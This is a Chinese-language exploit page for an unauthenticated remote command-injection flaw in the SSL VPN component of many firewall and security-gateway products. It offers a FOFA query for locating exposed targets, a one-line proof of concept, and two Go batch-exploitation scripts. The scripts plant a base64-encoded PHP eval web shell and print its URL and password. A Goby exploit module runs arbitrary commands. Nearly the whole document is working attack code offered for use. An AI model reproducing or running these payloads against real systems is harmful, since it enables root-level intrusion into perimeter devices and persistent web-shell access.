##  多个防火墙产品RCE

## 影响版本
```
H3C-下一代防火墙
安恒信息-明御安全网关
MAiPU-安全网关
D_Link-下一代防火墙
HUAWEI-公司产品
迈普通信技术股份有限公司安全网关
博达通信-下一代防火墙
任天行网络安全管理系统\安全审计系统
安博通应用网关
烽火网络安全审计
瑞斯康达科技发展股份有限公司安全路由器
任子行网络安全审计系统
绿盟安全审计系统
深圳市鑫塔科技有限公司第二代防火墙
```

## fofa
```
body="/webui/images/default/default/alert_close.jpg"
```

## poc
```
/sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt
```

## 批量利用脚本
```go
package main

import (
    "crypto/tls"
    "fmt"
    "github.com/fatih/color"
    "github.com/hpifu/go-kit/hflag"
    "github.com/imroc/req/v3"
    "github.com/thanhpk/randstr"
    "net/http"
    "strings"
    "time"
)

var reqHeader = map[string]string{
    "User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh-TW;q=0.9,zh;q=0.8",
    "Connection":      "close",
}

func main() {
    hflag.AddFlag("target", "SSLVPN系统地址", hflag.Required(), hflag.Shorthand("t"))
    if err2 := hflag.Parse(); err2 != nil {
       fmt.Println(hflag.Usage())
       return
    }
    targetHost := hflag.GetString("target")
    filename := randstr.Hex(8) + ".php"
    vulPath := "/sslvpn/sslvpn_client.php?client=logoImg&img=/tmp|echo%20PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2MnXSk7Pz4=|base64%20-d|tee%20/usr/local/webui/sslvpn/" + filename
    fullURL := strings.Replace(targetHost+vulPath, "//ss", "/ss", 1)
    cli := reqCli()
    get, err := cli.R().Get(fullURL)
    if err != nil {
       fmt.Println(err)
       return
    }
    defer func() {
       _ = get.Body.Close()
    }()
    shellURL := strings.Replace(targetHost+"/sslvpn/"+filename, "//ss", "/ss", 1)

    if get.StatusCode == http.StatusOK {
       if strings.Contains(get.String(), "|base64 -d|tee /usr/local/webui/sslvpn/") {
         fmt.Println(color.RedString("\nShell URL Is : %s\nShell Pass is : c\n", shellURL))
         return
       }
    }
    fmt.Println(color.GreenString("\n%s", "站点安全不存在漏洞"))
    return
}

func reqCli() *req.Client {
    cli := req.C()
    for k, v := range reqHeader {
       cli.SetCommonHeader(k, v)
    }
    cli.SetTimeout(time.Second * 10)
    cli.SetTLSFingerprintSafari()
    cli.SetAutoDecodeAllContentType()
    cli.TLSClientConfig = &tls.Config{InsecureSkipVerify: true,
       MinVersion: tls.VersionTLS10,
       MaxVersion: tls.VersionTLS13}
    return cli
}
```

```go
package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Multiple Security Gateway Frontend RCE",
    "Description": "A 0day RCE in multiple security gateway",
    "Product": "Multiple Security Gateway",
    "Homepage": "https://gobies.org/",
    "DisclosureDate": "2021-05-30",
    "Author": "gobysec@gmail.com",
    "GobyQuery": "header=\"Set-Cookie: USGSESSID\"",
    "Level": "3",
    "Impact": "<p>The attackers are allowed to execute any code with root privilege without any login crenditials.</p>",
    "Recommendation": "<p>1. For security devices, it's not recommended to make them accessable from Internet.</p><p>2. You should contact the product suppliance for help.</p>",
    "References": [
        "https://gobies.org/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/hosts ",
            "show": "Enter the command you want to execute"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/sslvpn/sslvpn_client.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/sslvpn/sslvpn_client.php?client=logoImg&img=%36%64%72%63%64%66%73%33%34%63%31%68%20%2f%74%6d%70%20%7c%7c%20%63%70%20%2f%65%74%63%2f%68%6f%73%74%73%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%31%2e%74%78%74%20%7c%7c%20%6c%73",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "iframe",
                    "Referer": "{{{hostinfo}}}",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "6drcdfs34c1h",
                        "bz": "random string"
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/images/basic/login/main_logo21.txt",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "iframe",
                    "Referer": "{{{hostinfo}}}",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "localhost",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/sslvpn/sslvpn_client.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "set_variable": [
                    "cmdUrlEncoded|cmd|url_encode|{{{cmd}}}"
                ],
                "uri": "/sslvpn/sslvpn_client.php?client=logoImg&img=%36%64%72%63%64%66%73%33%34%63%31%68%20%2f%74%6d%70%20%7c%7c%20%20{{{cmdUrlEncoded}}}%20%7c%20%74%65%65%20%2f%65%74%63%2f%68%6f%73%74%73%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%31%2e%74%78%74%20%7c%7c%20%6c%73",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "iframe",
                    "Referer": "{{{hostinfo}}}",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "6drcdfs34c1h",
                        "bz": "random string"
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/images/basic/login/main_logo21.txt",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "iframe",
                    "Referer": "{{{hostinfo}}}",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody"
            ]
        }
    ],
    "Tags": [
        "RCE",
        "0day"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6807"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
```

## 另外一个点
```go
package main

import (
        "crypto/tls"
        "fmt"
        "github.com/fatih/color"
        "github.com/hpifu/go-kit/hflag"
        "github.com/imroc/req/v3"
        "github.com/liushuochen/gotable"
        "github.com/liushuochen/gotable/table"
        "github.com/thanhpk/randstr"
        "net/http"
        "os"
        "strings"
        "time"
)

func main() {
        now := time.Now()
        host, addr := getUserParams()
        exploit(host, addr)
        fmt.Println(color.GreenString("Total Use Time : %s\n", time.Since(now).String()))
}
func httpReqClient() *req.Client {
        var reqHeader = map[string]string{
                "User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "zh-CN,zh-TW;q=0.9,zh;q=0.8",
                "Connection":      "close",
        }
        cli := req.C()
        for reqHeaderName, reqHeaderValue := range reqHeader {
                cli.SetCommonHeader(reqHeaderName, reqHeaderValue)
        }
        cli.EnableForceHTTP1()
        cli.SetTLSFingerprintSafari()
        cli.SetTimeout(time.Second * 15)
        cli.SetRedirectPolicy(req.NoRedirectPolicy())
        cli.SetAutoDecodeAllContentType()
        cli.TLSClientConfig = &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS10, MaxVersion: tls.VersionTLS13}
        return cli
}

func getUserParams() (host, proxyAddr string) {
        hflag.AddFlag("target", "目标地址", hflag.Required(), hflag.Shorthand("t"))
        hflag.AddFlag("proxy", "代理地址", hflag.Shorthand("p"))
        if err := hflag.Parse(); err != nil {
                fmt.Println(color.RedString("%s", hflag.Usage()))
                os.Exit(1)
        }
        target := hflag.GetString("target")
        proxyString := hflag.GetString("proxy")
        return target, proxyString
}

func randFile() string {
        filename := randstr.Hex(8)
        return filename
}
func fmtTable() *table.Table {
        tab, _ := gotable.Create(color.GreenString("%s", "Shell连接工具"), color.RedString("%s", "Shell连接地址"), color.BlueString("%s", "Shell连接密码"))
        return tab
}

func exploit(t, p string) {
        filename := randFile() + ".php"
        vulPath := "/sslvpn/sk403.php?client=logoImg&img=/tmp|echo%20PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2MnXSk7Pz4=|base64%20-d|tee%20/usr/local/webui/sslvpn/" + filename
        fullURL := strings.Replace(t+vulPath, "//ss", "/ss", 1)
        client := httpReqClient()
        if p != "" {
                client.SetProxyURL(p)
        }
        get, err := client.R().Get(fullURL)
        if err != nil {
                fmt.Println(err)
        }
        defer func() {
                _ = get.Body.Close()
        }()
        ShellURL := strings.Replace(t+"/sslvpn/"+filename, "//ss", "/ss", 1)
        if get.StatusCode == http.StatusOK {
                if strings.Contains(get.String(), "/usr/local/webui/sslvpn/") {
                        t2 := fmtTable()
                        _ = t2.AddRow([]string{
                                "AntSword", ShellURL, "c",
                        })
                        fmt.Println(t2)
                        return
                }
        } else {
                fmt.Println(color.RedString("%s", "站点不存在漏洞,安全的很"))
                return
        }
}
```
